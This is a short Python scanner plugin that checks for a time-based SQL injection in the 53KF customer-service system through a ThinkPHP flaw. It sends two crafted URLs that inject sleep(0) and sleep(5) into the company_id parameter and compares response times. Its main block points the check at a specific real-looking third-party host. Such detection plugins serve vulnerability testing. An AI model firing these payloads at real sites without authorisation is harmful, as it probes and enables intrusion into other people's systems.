#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 53KF(53客服)sql注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0114927
description:
    ThinkPHP 导致的sql注入
'''

import time

def assign(service, arg):
    if service == '53kf':
        return True, arg

def audit(arg):
    #sleep(0)
    payload1 = arg + 'new/client.php?m=Statistic&a=setLost&field=chat_robot_lost&type=plus&company_id[0]==-1%20or%201!=sleep(0)))limit%201%23between'
    #sleep(5)
    payload2 = arg + 'new/client.php?m=Statistic&a=setLost&field=chat_robot_lost&type=plus&company_id[0]==-1%20or%201!=sleep(5)))limit%201%23between'
    t1 = time.time()
    code, head, res, err, _ =curl.curl2(payload1)
    if code != 200:
        return False
    t2 = time.time()
    code, head, res, err, _ = curl.curl2(payload2)
    if code != 200:
        return False
    t3 = time.time()
    if (t3+t1 - 2*t2) > 4:
        security_hole('sql injection: '+payload2)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('53kf', 'http://kf02.baicmotorsales.com/')[1])